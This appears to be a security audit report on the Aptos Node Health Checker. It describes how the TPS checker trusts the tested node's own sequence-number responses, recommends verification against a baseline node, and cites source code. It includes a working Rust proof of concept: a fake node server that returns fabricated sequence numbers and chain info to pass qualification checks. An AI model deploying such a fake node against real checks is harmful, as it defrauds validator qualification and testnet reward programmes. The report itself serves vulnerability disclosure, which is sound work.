# Audit Report

## Title
Node Health Checker TPS Verification Can Be Completely Bypassed by Malicious Target Nodes

## Summary
The TPS (Transactions Per Second) checker in the Node Health Checker (NHC) completely trusts the target node being tested to report its own performance metrics. A malicious node operator can bypass all TPS verification requirements by returning fake responses, allowing underpowered infrastructure to pass qualification checks designed to ensure minimum performance standards.

## Finding Description

The TPS checker's verification process contains a critical trust violation where the node being tested is also the sole source of truth for whether it passed the test.

The attack flow is as follows:

1. **Provider Trust**: The TPS checker obtains the target node's chain_id and URL from `target_api_index_provider` [1](#0-0) 

2. **Transaction Submission**: The checker creates a transaction cluster pointing to the target node and emits test transactions [2](#0-1) 

3. **Self-Verification**: To verify transaction commitment, the checker queries account sequence numbers from **the same target node** [3](#0-2) 

4. **No Independent Validation**: The "committed" transaction count is calculated solely based on sequence numbers returned by the target node [4](#0-3) 

A malicious node operator can exploit this by:
- Accepting test transaction submissions immediately without actual execution
- Returning fake account sequence numbers that match expected values
- Reporting high TPS without processing any transactions
- Passing qualification checks with underpowered infrastructure

The fundamental flaw is that the target node serves as both the test subject AND the verifier of its own performance, creating a circular trust relationship with no independent validation.

## Impact Explanation

This vulnerability has **High Severity** impact based on the following factors:

**Validator Quality Degradation**: The NHC is used to verify validator fullnode quality for network participation and incentivized testnets (AIT3). Bypassing TPS checks allows operators to:
- Run underpowered infrastructure that appears qualified
- Degrade overall network performance and reliability  
- Earn testnet rewards without proper resource investment
- Potentially affect validator set quality standards

**Protocol Violation**: This represents a "Significant protocol violation" under the High severity category [5](#0-4) , as the entire purpose of the TPS checker is to enforce minimum performance requirements for network participation.

While this does not directly compromise consensus safety or enable fund theft (which would be Critical severity), it undermines the validator qualification process that is essential for maintaining network health and performance standards.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low Barrier**: Any node operator undergoing NHC testing can exploit this by simply implementing fake responses
2. **Direct Incentive**: Clear economic incentive in incentivized testnets to pass checks without proper infrastructure
3. **No Detection**: Without independent verification, fake responses are indistinguishable from legitimate ones
4. **Simple Exploitation**: Does not require sophisticated attacks - just return expected sequence numbers

The only requirement is that the attacker controls the node being tested, which is the normal case for validator operators seeking qualification.

## Recommendation

Implement **independent verification** of transaction commitment by cross-checking with a separate trusted baseline node:

1. Submit transactions to the target node as currently done
2. Query transaction commitment status from BOTH the target node AND a trusted baseline node
3. Compare responses to detect discrepancies
4. Only accept results if both nodes confirm transaction commitment
5. Verify state roots match between target and baseline for the tested block range

Implementation approach:
```rust
// In TpsChecker::check(), add baseline verification:
// 1. Get baseline_api_index_provider from providers
// 2. After emitting transactions, query BOTH target and baseline
// 3. Compare account sequence numbers from both sources
// 4. Verify state consistency between nodes
// 5. Only count transactions as committed if both nodes agree
```

Additionally, consider:
- Using block height/version comparisons between nodes
- Verifying state proof signatures from the target node
- Implementing challenge-response protocols for transaction verification
- Cross-validating chain_id with multiple independent sources during cluster creation [6](#0-5) 

## Proof of Concept

```rust
// Malicious node implementation that bypasses TPS check

use axum::{Router, Json, extract::Path};
use serde_json::json;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};

// Fake node state
struct FakeNodeState {
    sequence_numbers: Arc<Mutex<HashMap<String, u64>>>,
}

// POST /transactions - accept all transactions
async fn submit_transaction(
    state: Arc<FakeNodeState>,
    Json(payload): Json<serde_json::Value>,
) -> Json<serde_json::Value> {
    // Extract sender address and increment fake sequence number
    if let Some(sender) = payload.get("sender").and_then(|s| s.as_str()) {
        let mut seq_nums = state.sequence_numbers.lock().unwrap();
        let seq_num = seq_nums.entry(sender.to_string()).or_insert(0);
        *seq_num += 1;
    }
    
    // Return fake success response immediately
    Json(json!({
        "hash": "0xfake_transaction_hash",
        "sender": payload.get("sender"),
        "sequence_number": payload.get("sequence_number"),
        "vm_status": {"type": "executed"}
    }))
}

// GET /accounts/{address} - return fake high sequence numbers
async fn get_account(
    state: Arc<FakeNodeState>,
    Path(address): Path<String>,
) -> Json<serde_json::Value> {
    let seq_nums = state.sequence_numbers.lock().unwrap();
    let sequence_number = seq_nums.get(&address).copied().unwrap_or(1000000);
    
    // Return fake account with high sequence number
    Json(json!({
        "sequence_number": sequence_number,
        "authentication_key": format!("0x{}", address),
    }))
}

// GET / - return fake chain info
async fn get_index() -> Json<serde_json::Value> {
    Json(json!({
        "chain_id": 4, // Fake testnet chain_id
        "epoch": "100",
        "ledger_version": "1000000",
        "ledger_timestamp": "1234567890",
        "node_role": "full_node",
        "block_height": "500000",
    }))
}

#[tokio::main]
async fn main() {
    let state = Arc::new(FakeNodeState {
        sequence_numbers: Arc::new(Mutex::new(HashMap::new())),
    });
    
    let app = Router::new()
        .route("/", axum::routing::get(get_index))
        .route("/transactions", axum::routing::post({
            let state = Arc::clone(&state);
            move |payload| submit_transaction(Arc::clone(&state), payload)
        }))
        .route("/accounts/:address", axum::routing::get({
            let state = Arc::clone(&state);
            move |address| get_account(Arc::clone(&state), address)
        }));
    
    // Run fake node on port 8080
    println!("Malicious node running on :8080");
    println!("Will pass any TPS check by returning fake responses");
    axum::Server::bind(&"0.0.0.0:8080".parse().unwrap())
        .serve(app.into_make_service())
        .await
        .unwrap();
}

/* 
To test:
1. Run this malicious node server
2. Point NHC TPS checker to http://localhost:8080
3. The TPS check will pass with maximum score despite no actual transaction processing
4. All transactions are "committed" according to fake sequence numbers
5. No independent verification detects the fraud
*/
```

**Notes:**
- This vulnerability is architecture-specific to the Node Health Checker's TPS verification mechanism
- While the NHC is not a consensus-critical component, it serves as a quality gate for validator participation  
- The circular trust model (test subject = test verifier) violates basic security principles
- Independent verification against trusted baseline nodes is essential for meaningful performance testing
- The issue affects validator qualification for both testnets and mainnet deployments that rely on NHC

### Citations

**File:** ecosystem/node-checker/src/checker/tps.rs (L112-128)
```rust
        let target_api_index_provider = get_provider!(
            providers.target_api_index_provider,
            self.config.common.required,
            ApiIndexProvider
        );

        let target_url = target_api_index_provider.client.build_path("/").unwrap();
        let chain_id = match target_api_index_provider.provide().await {
            Ok(response) => ChainId::new(response.chain_id),
            Err(err) => {
                return Ok(vec![Self::build_result(
                    "Failed to get chain ID of your node".to_string(),
                    0,
                    format!("There was an error querying your node's API: {:#}", err),
                )]);
            },
        };
```

**File:** ecosystem/node-checker/src/checker/tps.rs (L130-149)
```rust
        let cluster_config = ClusterArgs {
            targets: Some(vec![target_url; self.config.repeat_target_count]),
            targets_file: None,
            coin_source_args: self.config.coin_source_args.clone(),
            chain_id: Some(chain_id),
            node_api_key: None,
        };
        let cluster = Cluster::try_from_cluster_args(&cluster_config)
            .await
            .map_err(TpsCheckerError::BuildClusterError)?;

        let stats = emit_transactions_with_cluster(
            &cluster,
            &self.config.emit_config,
            self.config
                .emit_workload_configs
                .args_to_transaction_mix_per_phase(),
        )
        .await
        .map_err(TpsCheckerError::TransactionEmitterError)?;
```

**File:** crates/transaction-emitter-lib/src/emitter/mod.rs (L1227-1236)
```rust
pub async fn get_account_seq_num(
    client: &RestClient,
    address: AccountAddress,
) -> Result<(u64, u64)> {
    let result = client.get_account_bcs(address).await;
    match &result {
        Ok(resp) => Ok((
            resp.inner().sequence_number(),
            Duration::from_micros(resp.state().timestamp_usecs).as_secs(),
        )),
```

**File:** crates/transaction-emitter-lib/src/emitter/submission_worker.rs (L436-463)
```rust
fn count_committed_expired_stats(
    account_to_start_and_end_seq_num: HashMap<AccountAddress, (u64, u64)>,
    latest_fetched_counts: HashMap<AccountAddress, u64>,
    account_to_orderless_txns: HashMap<AccountAddress, HashSet<HashValue>>,
    failed_orderless_txns: HashMap<AccountAddress, HashSet<HashValue>>,
) -> (usize, usize) {
    let (seq_num_committed, seq_num_failed) = account_to_start_and_end_seq_num
        .iter()
        .map(
            |(address, (start_seq_num, end_seq_num))| match latest_fetched_counts.get(address) {
                Some(count) => {
                    assert!(
                        *count <= *end_seq_num,
                        "{address} :: {count} > {end_seq_num}"
                    );
                    if *count >= *start_seq_num {
                        (
                            (*count - *start_seq_num) as usize,
                            (*end_seq_num - *count) as usize,
                        )
                    } else {
                        debug!(
                            "Stale sequence_number fetched for {}, start_seq_num {}, fetched {}",
                            address, start_seq_num, *count
                        );
                        (0, (*end_seq_num - *start_seq_num) as usize)
                    }
                },
```

**File:** ecosystem/node-checker/Cargo.toml (L1-5)
```text
[package]
name = "aptos-node-checker"
description = "Aptos Node Health Checker"
version = "0.1.1"

```

**File:** crates/transaction-emitter-lib/src/cluster.rs (L100-110)
```rust
        let chain_id_from_instances = get_chain_id_from_instances(instance_states.clone())?;
        let chain_id: ChainId = match maybe_chain_id {
            Some(c) => c,
            None => {
                warn!(
                    "Chain ID not provided, using the chain ID derived from the rest endpoints: {}",
                    chain_id_from_instances
                );
                chain_id_from_instances
            },
        };
```
